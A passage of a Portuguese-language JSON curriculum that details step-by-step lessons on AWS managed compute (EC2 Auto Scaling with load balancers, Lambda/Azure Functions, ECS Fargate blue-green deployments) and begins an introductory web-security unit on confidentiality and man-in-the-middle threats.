                        "id": "10.1.4.5.3",
                        "name": "Serviços de Computação Gerenciados",
                        "description": "Serviços de compute como EC2 gerenciado, serverless (Lambda) e containers (ECS/EKS), que abstraem gerenciamento de infraestrutura para foco no código, permitindo escalabilidade elástica em aplicações para a nuvem.",
                        "specificSkills": [
                          {
                            "id": "10.1.4.5.3.1",
                            "name": "Provisionar e gerenciar instâncias de compute gerenciadas",
                            "description": "Lançar instâncias EC2 com Auto Scaling Groups (ASG), definição de launch templates e integração com load balancers (ALB) para distribuição de tráfego em aplicações web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar um Launch Template para instâncias EC2",
                                  "subSteps": [
                                    "Acesse a console AWS EC2 e navegue para Launch Templates.",
                                    "Defina configurações básicas: AMI (Amazon Machine Image) compatível com sua aplicação web (ex: Amazon Linux 2), tipo de instância (ex: t3.micro).",
                                    "Configure storage: adicione um volume EBS com tamanho adequado (ex: 8 GiB, gp3).",
                                    "Defina tags para identificação (ex: Key: Environment, Value: Production).",
                                    "Configure security groups para permitir tráfego HTTP/HTTPS (portas 80/443).",
                                    "Revise e crie o Launch Template."
                                  ],
                                  "verification": "Verifique na seção Launch Templates se o template foi criado com status 'Available' e configurações corretas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Conta AWS com permissões EC2",
                                    "Console AWS ou AWS CLI",
                                    "AMI pública ou personalizada"
                                  ],
                                  "tips": "Use o modo 'Quick Launch' para configurações simples iniciais e edite conforme necessário.",
                                  "learningObjective": "Entender como parametrizar configurações de instâncias EC2 para uso consistente em ASGs.",
                                  "commonMistakes": "Esquecer de configurar security groups, resultando em instâncias inacessíveis; selecionar AMI incompatível com a aplicação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Auto Scaling Group (ASG) usando o Launch Template",
                                  "subSteps": [
                                    "Navegue para Auto Scaling Groups na console EC2.",
                                    "Crie um novo ASG selecionando o Launch Template criado.",
                                    "Defina nome do grupo e VPC/subnets para lançamento (múltiplas AZs para alta disponibilidade).",
                                    "Configure políticas de escalabilidade: desejado (2), mínimo (1), máximo (4); adicione alarmes CloudWatch para CPU >70%.",
                                    "Habilite health checks com ELB se aplicável (será integrado depois).",
                                    "Revise e crie o ASG."
                                  ],
                                  "verification": "Confira na lista de ASGs se o grupo está 'InService' com instâncias lançadas conforme configurações.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Launch Template criado",
                                    "CloudWatch para métricas",
                                    "VPC configurada"
                                  ],
                                  "tips": "Escolha múltiplas AZs para resiliência; teste com capacidade mínima 1 para validar.",
                                  "learningObjective": "Dominar criação de ASGs para escalabilidade automática baseada em métricas.",
                                  "commonMistakes": "Não selecionar múltiplas subnets, causando falhas em uma AZ; configurações de scaling muito agressivas levando a custos altos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Criar Application Load Balancer (ALB) e Target Group",
                                  "subSteps": [
                                    "Acesse a console EC2 > Load Balancers e crie um ALB.",
                                    "Configure nome, scheme (internet-facing), listeners (HTTP:80 redirecionando para HTTPS:443).",
                                    "Selecione VPC e múltiplas subnets públicas.",
                                    "Crie um novo Target Group: tipo IP ou Instance, health check path '/health' (para apps web).",
                                    "Defina security groups para ALB permitindo tráfego inbound 80/443.",
                                    "Revise e crie o ALB."
                                  ],
                                  "verification": "Verifique se o ALB está 'Active', com DNS name gerado e Target Group vazio inicialmente.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "VPC com subnets públicas",
                                    "Security Groups para ALB"
                                  ],
                                  "tips": "Use HTTPS com ACM para produção; configure health checks rigorosos para evitar tráfego para instâncias ruins.",
                                  "learningObjective": "Aprender a configurar ALBs para distribuição de tráfego HTTP/HTTPS em aplicações web escaláveis.",
                                  "commonMistakes": "Configurar ALB em subnets privadas sem NAT Gateway; health checks mal definidos causando drain de targets."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar ASG com ALB e testar escalabilidade",
                                  "subSteps": [
                                    "Edite o ASG e associe ao Target Group do ALB na aba 'Activity'.",
                                    "Aguarde instâncias entrarem em 'Healthy' no Target Group.",
                                    "Acesse o DNS do ALB para verificar distribuição de tráfego (use curl ou browser).",
                                    "Simule carga com ferramentas como Apache Bench (ab) ou Locust para trigger scaling.",
                                    "Monitore métricas no CloudWatch (CPU, requests) e verifique auto-scaling.",
                                    "Ajuste políticas se necessário."
                                  ],
                                  "verification": "Confirme que tráfego é distribuído entre instâncias, novas instâncias escalam sob carga e health checks funcionam.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "ALB e Target Group criados",
                                    "Ferramentas de load test (opcional: AWS CLI)"
                                  ],
                                  "tips": "Use session stickiness se estado for necessário; monitore logs com CloudWatch Logs.",
                                  "learningObjective": "Integrar componentes para um sistema auto-escalável e resiliente.",
                                  "commonMistakes": "Não registrar ASG no Target Group corretamente; ignorar métricas levando a under/over provisioning."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Monitorar e otimizar o ambiente provisionado",
                                  "subSteps": [
                                    "Configure dashboards CloudWatch para ASG, ALB e EC2 metrics.",
                                    "Habilite notificações SNS para eventos de scaling.",
                                    "Analise custos com AWS Cost Explorer focado em EC2/ASG.",
                                    "Implemente lifecycle hooks para ações customizadas (ex: drain connections).",
                                    "Teste failover simulando falha de instância."
                                  ],
                                  "verification": "Dashboard mostra métricas em tempo real; scaling responde a simulações.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "CloudWatch, SNS",
                                    "AWS Cost Explorer"
                                  ],
                                  "tips": "Use Savings Plans para otimização de custos em produção.",
                                  "learningObjective": "Garantir operação sustentável e observável do ambiente gerenciado.",
                                  "commonMistakes": "Não configurar alarmes, perdendo visibilidade; ignorar custos de dados de ALB."
                                }
                              ],
                              "practicalExample": "Desenvolva uma aplicação web simples (Nginx servindo 'Hello World') em uma AMI customizada. Lance ASG com 2 instâncias, integre ALB e teste com 100 requests/segundo para ver scaling de 2 para 4 instâncias.",
                              "finalVerifications": [
                                "ASG mantém capacidade desejada sob carga variável.",
                                "ALB distribui tráfego uniformemente para instâncias healthy.",
                                "Instâncias não-healthy são substituídas automaticamente.",
                                "Métricas CloudWatch mostram scaling baseado em CPU/requests.",
                                "DNS do ALB responde com baixa latência (<200ms).",
                                "Custos estimados abaixo de threshold diário."
                              ],
                              "assessmentCriteria": [
                                "Launch Template configurado corretamente com AMI, storage e SGs (100%).",
                                "ASG com políticas de scaling e múltiplas AZs implementadas (100%).",
                                "ALB com listeners HTTPS e health checks funcionais (100%).",
                                "Integração ASG-Target Group sem erros de registro (100%).",
                                "Testes de load confirmam escalabilidade e distribuição (90%).",
                                "Monitoramento CloudWatch ativo com alarmes (80%)."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Configuração de VPC, subnets e security groups.",
                                "DevOps: Integração com CI/CD para atualizações de launch templates.",
                                "Segurança: IAM roles para ASG, encryption em EBS/ALB.",
                                "Monitoramento: Uso de CloudWatch e X-Ray para tracing.",
                                "Custos: Otimização com Cost Explorer e Budgets."
                              ],
                              "realWorldApplication": "Em e-commerce como Amazon ou Magazine Luiza, ASGs com ALB gerenciam picos de Black Friday, escalando automaticamente de 10 para 1000 instâncias, distribuindo tráfego e mantendo 99.9% uptime sem intervenção manual."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.3.2",
                            "name": "Desenvolver funções serverless para compute",
                            "description": "Criar e deployar funções AWS Lambda ou Azure Functions, configurando triggers (API Gateway, S3 events) para processamento assíncrono e escalável sem gerenciamento de servidores.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de desenvolvimento para funções serverless",
                                  "subSteps": [
                                    "Instalar e configurar AWS CLI ou Azure CLI com credenciais de conta.",
                                    "Instalar SDKs locais (ex: AWS SAM CLI para Lambda ou Azure Functions Core Tools).",
                                    "Criar uma conta gratuita na AWS ou Azure e configurar IAM roles com permissões mínimas.",
                                    "Configurar um editor de código (VS Code) com extensões para serverless (ex: AWS Toolkit).",
                                    "Testar configuração executando um comando de listagem de regiões ou funções existentes."
                                  ],
                                  "verification": "Executar 'aws lambda list-functions' ou 'az functionapp list' sem erros e ver funções/regiões listadas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "AWS CLI",
                                    "Azure CLI",
                                    "VS Code com extensões",
                                    "Conta AWS/Azure gratuita"
                                  ],
                                  "tips": "Use perfis IAM com privilégios least-privilege para evitar riscos de segurança.",
                                  "learningObjective": "Entender e preparar o ambiente local para desenvolvimento serverless sem servidores.",
                                  "commonMistakes": [
                                    "Configurar credenciais incorretas levando a erros de autenticação",
                                    "Instalar ferramentas incompatíveis com o SO",
                                    "Ignorar configuração de regiões padrão"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar e codificar a função serverless básica",
                                  "subSteps": [
                                    "Inicializar um template de projeto (ex: sam init para AWS Lambda ou func init para Azure).",
                                    "Escrever código handler em Python/Node.js que processe um evento simples (ex: retornar JSON).",
                                    "Definir configurações como runtime, memory e timeout no arquivo de template (template.yaml ou function.json).",
                                    "Adicionar logging com console.log ou print para depuração.",
                                    "Testar localmente com sam local invoke ou func start."
                                  ],
                                  "verification": "Função executa localmente com input de teste e retorna output esperado nos logs.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "AWS SAM CLI",
                                    "Azure Functions Core Tools",
                                    "Linguagem de programação (Python/Node.js)"
                                  ],
                                  "tips": "Mantenha handlers stateless e evite dependências globais para escalabilidade.",
                                  "learningObjective": "Desenvolver lógica de negócio em formato serverless com handlers event-driven.",
                                  "commonMistakes": [
                                    "Exceder timeout padrão (3s no Azure)",
                                    "Usar variáveis de estado global",
                                    "Ignorar tratamento de erros no handler"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar triggers e eventos para a função",
                                  "subSteps": [
                                    "Criar um API Gateway REST/HTTP API trigger no template ou portal.",
                                    "Configurar S3 event trigger para bucket específico (ex: ObjectCreated).",
                                    "Mapear parâmetros de evento para variáveis no código (ex: event['body']).",
                                    "Adicionar políticas IAM para a função acessar S3/API Gateway.",
                                    "Validar configurações no console AWS/Azure."
                                  ],
                                  "verification": "Triggers listados na função no console e políticas IAM anexadas corretamente.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "AWS Console/Azure Portal",
                                    "Template YAML/JSON"
                                  ],
                                  "tips": "Use filtros de evento no S3 para evitar invocações desnecessárias.",
                                  "learningObjective": "Integrar funções serverless com fontes de eventos assíncronas para processamento escalável.",
                                  "commonMistakes": [
                                    "Permissões IAM insuficientes causando AccessDenied",
                                    "Configurar triggers sem filtros levando a loops",
                                    "Ignorar cold starts em APIs de alta latência"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Deployar a função e configurar ambiente de produção",
                                  "subSteps": [
                                    "Executar sam deploy ou func azure functionapp publish.",
                                    "Configurar variáveis de ambiente seguras (ex: secrets no SSM Parameter Store ou Key Vault).",
                                    "Habilitar VPC se necessário para acesso a recursos privados.",
                                    "Configurar camadas (layers) para dependências compartilhadas.",
                                    "Verificar deployment no console com status ACTIVE."
                                  ],
                                  "verification": "Função aparece no console com URL de invoke ou endpoint API funcional.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "CLI de deployment",
                                    "Console AWS/Azure"
                                  ],
                                  "tips": "Use CI/CD com GitHub Actions para automação futura.",
                                  "learningObjective": "Publicar funções serverless em produção com configurações seguras e escaláveis.",
                                  "commonMistakes": [
                                    "Deployar sem variáveis de ambiente causando falhas",
                                    "Expor endpoints sem autenticação",
                                    "Ignorar limites de concurrency"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, monitorar e otimizar a função",
                                  "subSteps": [
                                    "Invocar via API Gateway ou simular S3 event com CLI.",
                                    "Analisar logs no CloudWatch ou Application Insights.",
                                    "Medir métricas como duração, erros e cold starts.",
                                    "Otimizar código para reduzir latência (ex: usar async/await).",
                                    "Implementar retry e dead letter queues para falhas."
                                  ],
                                  "verification": "Testes passam com 100% sucesso, logs mostram processamento correto e métricas abaixo de thresholds.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Postman para testes API",
                                    "CloudWatch/Application Insights"
                                  ],
                                  "tips": "Monitore cold starts provisionando concurrency.",
                                  "learningObjective": "Garantir confiabilidade e performance em cenários serverless reais.",
                                  "commonMistakes": [
                                    "Não tratar erros levando a invocações falhas silenciosas",
                                    "Ignorar custos de cold starts",
                                    "Falta de DLQ causando perda de eventos"
                                  ]
                                }
                              ],
                              "practicalExample": "Crie uma função AWS Lambda acionada por upload de imagem no S3: a função detecta o evento, baixa a imagem, redimensiona com Pillow e salva uma thumbnail no mesmo bucket. Configure API Gateway para status via GET /status/{id}.",
                              "finalVerifications": [
                                "Função deployada e invocável via trigger sem erros.",
                                "Processamento assíncrono de eventos S3 com logs corretos.",
                                "API Gateway responde com HTTP 200 e payload JSON.",
                                "Métricas mostram escalabilidade (múltiplas invocações simultâneas).",
                                "Dead Letter Queue configurada para eventos falhos.",
                                "Custos estimados abaixo de $0.01 para 1000 invocações."
                              ],
                              "assessmentCriteria": [
                                "Código handler stateless e idempotente.",
                                "Configurações de segurança (IAM least-privilege, HTTPS).",
                                "Latência média < 500ms em testes de carga.",
                                "100% cobertura de testes unitários/integração.",
                                "Documentação de deployment em README.",
                                "Otimização para cold starts demonstrada."
                              ],
                              "crossCurricularConnections": [
                                "Programação Assíncrona (Node.js/Python async)",
                                "Arquitetura de Microsserviços e Event-Driven",
                                "DevOps e CI/CD com GitHub Actions",
                                "Segurança em Nuvem (IAM, Secrets Management)",
                                "Análise de Dados (Logs com CloudWatch Logs Insights)"
                              ],
                              "realWorldApplication": "Processamento de pedidos em e-commerce (ex: gerar faturas assincronamente), APIs de chatbots escaláveis, ETL de dados IoT sem servidores, backend de apps mobile com alto tráfego variável."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.4.5.3.3",
                            "name": "Orquestrar containers em serviços gerenciados",
                            "description": "Deployar aplicações Dockerizadas em ECS ou EKS, usando Fargate para serverless containers, com blue-green deployments para zero downtime em produção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Pré-requisitos e Autenticação AWS",
                                  "subSteps": [
                                    "Criar conta AWS com privilégios IAM para ECS/EKS (roles como ecsTaskExecutionRole)",
                                    "Configurar VPC com subnets públicas/privadas e security groups para tráfego HTTP/HTTPS",
                                    "Instalar AWS CLI e Docker localmente, autenticar com 'aws configure'",
                                    "Criar ECR repository para armazenar a imagem Docker da aplicação",
                                    "Fazer build e push da imagem Docker para ECR usando 'docker build' e 'aws ecr get-login-password'"
                                  ],
                                  "verification": "Verificar no console AWS se o repositório ECR contém a imagem e IAM roles existem",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": "Conta AWS gratuita/trial, AWS CLI v2, Docker Desktop, terminal",
                                  "tips": "Use AWS IAM Access Analyzer para permissões mínimas e evite root user",
                                  "learningObjective": "Entender autenticação e rede básica para orquestração de containers",
                                  "commonMistakes": "Esquecer de adicionar policy AmazonECSTaskExecutionRolePolicy à role; usar credenciais erradas no CLI"
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar Cluster ECS com Fargate",
                                  "subSteps": [
                                    "No console AWS ECS, criar cluster do tipo Fargate (serverless)",
                                    "Selecionar VPC e subnets criadas, habilitar container insights para monitoramento",
                                    "Definir configurações de rede: security group permitindo portas 80/443 inbound",
                                    "Confirmar criação via AWS CLI: 'aws ecs describe-clusters --clusters <cluster-name>'",
                                    "Testar conectividade criando um task de teste simples"
                                  ],
                                  "verification": "Cluster status 'ACTIVE' no console ECS e CLI retorna detalhes sem erros",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": "Console AWS ECS, AWS CLI, VPC pré-configurada",
                                  "tips": "Escolha Fargate para evitar gerenciamento de EC2; ative CloudWatch para logs",
                                  "learningObjective": "Dominar criação de clusters serverless para escalabilidade automática",
                                  "commonMistakes": "Subnets sem roteamento para internet (NAT Gateway ausente); cluster sem insights ativado"
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir Task Definition e Service Básico",
                                  "subSteps": [
                                    "Criar Task Definition JSON/Fargate: especificar imagem ECR, CPU 0.25 vCPU, memória 512MB, porta 80",
                                    "Configurar variáveis de ambiente, health check endpoint (/health)",
                                    "Registrar task definition via CLI: 'aws ecs register-task-definition --cli-input-json file://task-def.json'",
                                    "Criar Service no cluster: 1-2 tasks desejados, load balancer ALB para distribuição",
                                    "Atualizar service para usar a task definition"
                                  ],
                                  "verification": "Service status 'ACTIVE' com tasks 'RUNNING' e health checks passando no console",
                                  "estimatedTime": "30-40 minutos",
                                  "materials": "JSON de task definition, AWS CLI, Application Load Balancer (ALB)",
                                  "tips": "Use containerPort matching ALB target group; defina health check grace period em 60s",
                                  "learningObjective": "Aprender a definir recursos computacionais e health checks para containers",
                                  "commonMistakes": "Porta exposta errada no task def; memória insuficiente causando OOMKilled"
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Blue-Green Deployments para Zero Downtime",
                                  "subSteps": [
                                    "No service ECS, editar deployment configuration para blue/green com CodeDeploy",
                                    "Criar App e Deployment Group no CodeDeploy para ECS, traffic routing em 100% nova versão após 5min",
                                    "Atualizar task definition com nova tag de imagem (v2), trigger deployment",
                                    "Monitorar no CodeDeploy console: validate blue, switch to green, monitor post-switch",
                                    "Rollback se falhar via CLI: 'aws deploy stop-deployment'"
                                  ],
                                  "verification": "Deployment bem-sucedido sem downtime (métrika TargetResponseTime < 1s), tráfego 100% na green",
                                  "estimatedTime": "40-50 minutos",
                                  "materials": "AWS CodeDeploy, ALB com target groups blue/green, CloudWatch alarms",
                                  "tips": "Configure alarms para CPU >80% ou unhealthy hosts; teste com curl durante switch",
                                  "learningObjective": "Implementar estratégias de deploy seguras para produção contínua",
                                  "commonMistakes": "Não configurar hooks de validação; ignorar minHealthyPercent em 100%"
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar, Monitorar e Otimizar o Deployment",
                                  "subSteps": [
                                    "Simular tráfego com Apache Bench ou Locust no endpoint ALB",
                                    "Verificar logs no CloudWatch Logs Insights: filtrar por task ARN",
                                    "Escalar service manualmente e observar auto-scaling Fargate",
                                    "Otimizar custos: ajustar CPU/memória baseada em métricas",
                                    "Documentar pipeline CI/CD com GitHub Actions para automação futura"
                                  ],
                                  "verification": "Zero downtime em testes de load, métricas estáveis, custos < $0.05/hora",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": "CloudWatch, ferramentas de load test (ab, Locust), GitHub",
                                  "tips": "Habilite X-Ray para tracing; use ECS Exec para debug interativo",
                                  "learningObjective": "Garantir resiliência e observabilidade em orquestração de containers",
                                  "commonMistakes": "Logs não enviados (task role sem CloudWatchFullAccess); escalas excessivas inflando custos"
                                }
                              ],
                              "practicalExample": "Deployar uma API Node.js (Express server com endpoint /api/users) Dockerizada em ECS Fargate: push v1 para ECR, deploy blue-green para v2 adicionando autenticação JWT, verificando zero downtime com 100 req/s via curl loop durante switchover.",
                              "finalVerifications": [
                                "Cluster ECS Fargate ativo com service rodando 2 tasks healthy",
                                "ALB responde <200ms com tráfego 100% na versão green",
                                "Logs CloudWatch mostram deploy sem erros ou restarts",
                                "Blue-green switch completa em <5min sem falhas de health check",
                                "Custo estimado exibido no AWS Cost Explorer < $1 para teste",
                                "Rollback simulado funciona restaurando tráfego para blue"
                              ],
                              "assessmentCriteria": [
                                "Sucesso no deploy blue-green sem downtime mensurável (>99.9% uptime)",
                                "Task definition otimizada (CPU/memória < limites Fargate mínimos)",
                                "Health checks passam em <30s com load simulado",
                                "Métricas CloudWatch: CPU <70%, memória >20% livre",
                                "Documentação de pipeline CI/CD incluída",
                                "Segurança: security groups restritos, IAM least-privilege"
                              ],
                              "crossCurricularConnections": [
                                "DevOps/CI-CD: Integração com CodePipeline para automação",
                                "Redes/Segurança: VPC peering, WAF no ALB",
                                "Monitoramento: CloudWatch + Prometheus/Grafana",
                                "Arquitetura de Software: Microservices e escalabilidade horizontal"
                              ],
                              "realWorldApplication": "Em e-commerces como Magazine Luiza, deployar atualizações de catálogos sem interromper vendas, escalando para Black Friday com Fargate auto-scaling e blue-green para testes A/B de features."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.4.5.3.1"
                            ]
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.5",
                "name": "Introdução à segurança de aplicações na Internet",
                "description": "Introduz princípios e práticas para proteger aplicações web contra vulnerabilidades comuns.",
                "totalSkills": 46,
                "atomicTopics": [
                  {
                    "id": "10.1.5.1",
                    "name": "Princípios da Triade CIA",
                    "description": "Confidencialidade, Integridade e Disponibilidade como fundamentos da segurança em aplicações web.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.1.1",
                        "name": "Confidencialidade",
                        "description": "Princípio da Triade CIA que garante que as informações sejam acessíveis apenas a entidades autorizadas, protegendo dados sensíveis em aplicações web contra acessos não autorizados.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.1.1.1",
                            "name": "Definir confidencialidade na segurança de aplicações web",
                            "description": "Explicar o conceito de confidencialidade como a garantia de que dados confidenciais não sejam divulgados a partes não autorizadas, com exemplos como senhas e dados de usuários em apps web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito básico de confidencialidade",
                                  "subSteps": [
                                    "Ler a definição de confidencialidade na triade CIA (Confidencialidade, Integridade, Disponibilidade).",
                                    "Identificar dados confidenciais, como senhas, informações pessoais e dados financeiros.",
                                    "Diferenciar confidencialidade de privacidade e outros princípios de segurança.",
                                    "Explicar por que a confidencialidade protege contra divulgação não autorizada.",
                                    "Anotar exemplos simples de dados sensíveis em contextos cotidianos."
                                  ],
                                  "verification": "Redigir uma definição em 2-3 frases e compará-la com fontes confiáveis.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Artigo sobre triade CIA (ex: OWASP ou Wikipedia)",
                                    "Vídeo introdutório de 5 minutos sobre segurança da informação"
                                  ],
                                  "tips": "Use analogias como uma conversa privada para fixar o conceito.",
                                  "learningObjective": "Definir confidencialidade e distinguir de outros pilares da segurança.",
                                  "commonMistakes": [
                                    "Confundir confidencialidade com anonimato",
                                    "Ignorar o foco em acesso não autorizado"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Relacionar confidencialidade à segurança de aplicações web",
                                  "subSteps": [
                                    "Analisar como apps web lidam com dados de usuários (login, perfis).",
                                    "Estudar riscos como interceptação de tráfego HTTP não criptografado.",
                                    "Identificar elementos web vulneráveis: formulários, cookies, sessões.",
                                    "Mapear exemplos: senhas em texto plano vs. hash.",
                                    "Discutir o impacto de breaches como vazamento de dados de usuários."
                                  ],
                                  "verification": "Listar 3 riscos específicos em apps web e como confidencialidade os mitiga.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação OWASP Top 10 (seção de quebra de acesso)",
                                    "Exemplo de código HTML simples com formulário de login"
                                  ],
                                  "tips": "Visualize o fluxo de dados em um diagrama simples no papel.",
                                  "learningObjective": "Aplicar o conceito de confidencialidade ao contexto de desenvolvimento web.",
                                  "commonMistakes": [
                                    "Focar apenas em senhas, ignorando outros dados como cartões de crédito",
                                    "Subestimar ataques como Man-in-the-Middle"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar mecanismos básicos para garantir confidencialidade",
                                  "subSteps": [
                                    "Aprender sobre criptografia básica (HTTPS vs HTTP).",
                                    "Entender hashing de senhas (ex: bcrypt).",
                                    "Discutir controle de acesso (autenticação e autorização).",
                                    "Analisar o uso de tokens JWT seguros.",
                                    "Simular configuração de HTTPS em um ambiente local."
                                  ],
                                  "verification": "Descrever 2 mecanismos e por que eles garantem confidencialidade.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Tutorial Mozilla sobre HTTPS",
                                    "Ferramenta online como Wireshark demo para tráfego HTTP"
                                  ],
                                  "tips": "Teste em um site local com ferramentas como ngrok para ver diferenças.",
                                  "learningObjective": "Identificar ferramentas e práticas para implementar confidencialidade em web apps.",
                                  "commonMistakes": [
                                    "Achar que HTTPS resolve tudo sozinho",
                                    "Confundir criptografia com ofuscação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar e aplicar o conceito",
                                  "subSteps": [
                                    "Resumir confidencialidade em uma frase chave para apps web.",
                                    "Criar um checklist de boas práticas.",
                                    "Analisar um caso real de violação (ex: Equifax breach).",
                                    "Discutir consequências legais e éticas.",
                                    "Planejar como aplicar em um projeto pessoal."
                                  ],
                                  "verification": "Produzir um resumo de 1 página com definição, exemplos e mecanismos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Caso de estudo de breach famoso (ex: notícia sobre Yahoo leak)",
                                    "Template de checklist de segurança"
                                  ],
                                  "tips": "Conecte o conceito a projetos reais para retenção melhor.",
                                  "learningObjective": "Integrar o conhecimento em um framework acionável para desenvolvimento seguro.",
                                  "commonMistakes": [
                                    "Generalizar demais sem exemplos web-específicos",
                                    "Ignorar aspectos não técnicos como políticas de acesso"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de e-commerce, configure um formulário de login transmitindo senhas via HTTP (vulnerável a sniffing) e depois via HTTPS (seguro). Use ferramentas como browser dev tools para inspecionar o tráfego e demonstrar a diferença na proteção de dados confidenciais.",
                              "finalVerifications": [
                                "Definir confidencialidade corretamente em termos da triade CIA.",
                                "Listar pelo menos 3 exemplos de dados confidenciais em apps web.",
                                "Explicar 2 mecanismos para garantir confidencialidade (ex: HTTPS, hashing).",
                                "Identificar uma violação comum e sua consequência.",
                                "Criar um diagrama simples de fluxo seguro de dados.",
                                "Discutir diferenças entre confidencialidade e integridade."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude da definição (30%)",
                                "Relevância e quantidade de exemplos web-específicos (25%)",
                                "Compreensão de mecanismos de proteção (20%)",
                                "Análise de riscos e violações (15%)",
                                "Clareza na síntese e aplicação prática (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Ética e Direito Digital: Implicações de leis como LGPD em breaches de confidencialidade.",
                                "Desenvolvimento Web: Integração com programação segura (HTML, JS, Node.js).",
                                "Matemática: Conceitos básicos de criptografia assimétrica.",
                                "Administração: Políticas de segurança e governança de dados em empresas."
                              ],
                              "realWorldApplication": "Em plataformas bancárias online como Nubank ou Itaú, a confidencialidade é garantida por HTTPS, tokens JWT e hashing de senhas, prevenindo que hackers intercepte dados de transações ou acessem contas de usuários via Wi-Fi público."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.1.1.2",
                            "name": "Identificar ameaças à confidencialidade em aplicações web",
                            "description": "Reconhecer ameaças comuns como interceptação de tráfego (man-in-the-middle) e vazamentos por configurações inadequadas, ilustrando com cenários reais em desenvolvimento web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de confidencialidade na Triade CIA",
                                  "subSteps": [
                                    "Defina confidencialidade como a proteção contra divulgação não autorizada de informações.",
                                    "Explique sua posição na Triade CIA (Confidencialidade, Integridade, Disponibilidade).",
                                    "Identifique tipos de dados sensíveis em apps web: senhas, tokens de sessão, dados pessoais.",
                                    "Discuta consequências de violações: roubo de identidade, multas regulatórias.",
                                    "Compare com integridade e disponibilidade para contextualizar."
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras explicando confidencialidade e exemplos em apps web.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Artigo da OWASP sobre Triade CIA",
                                    "Vídeo introdutório de 5 minutos sobre segurança web"
                                  ],
                                  "tips": [
                                    "Use analogias como 'cofre' para dados sensíveis para fixar o conceito."
                                  ],
                                  "learningObjective": "Dominar a definição e importância da confidencialidade em aplicações web.",
                                  "commonMistakes": [
                                    "Confundir confidencialidade com criptografia (é mais ampla)",
                                    "Ignorar contexto web-specifico"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estudar a ameaça de interceptação de tráfego (Man-in-the-Middle - MITM)",
                                  "subSteps": [
                                    "Descreva MITM: atacante intercepta comunicação entre cliente e servidor.",
                                    "Explique cenários comuns: Wi-Fi público, ARP spoofing em redes locais.",
                                    "Analise vulnerabilidades em HTTP: tráfego em texto plano legível.",
                                    "Discuta mitigações básicas: uso de HTTPS/TLS.",
                                    "Identifique ferramentas de demonstração: Wireshark para captura de pacotes."
                                  ],
                                  "verification": "Desenhe e rotule um diagrama de fluxo de um ataque MITM em uma app web.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Vídeo tutorial sobre MITM no YouTube",
                                    "Ferramenta Wireshark (versão demo)",
                                    "Diagrama OWASP MITM"
                                  ],
                                  "tips": [
                                    "Teste em ambiente controlado como localhost para visualizar tráfego."
                                  ],
                                  "learningObjective": "Reconhecer mecanismos e impactos de ataques MITM em apps web.",
                                  "commonMistakes": [
                                    "Achar que HTTPS é invulnerável sem HSTS",
                                    "Subestimar riscos em redes não confiáveis"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar vazamentos por configurações inadequadas",
                                  "subSteps": [
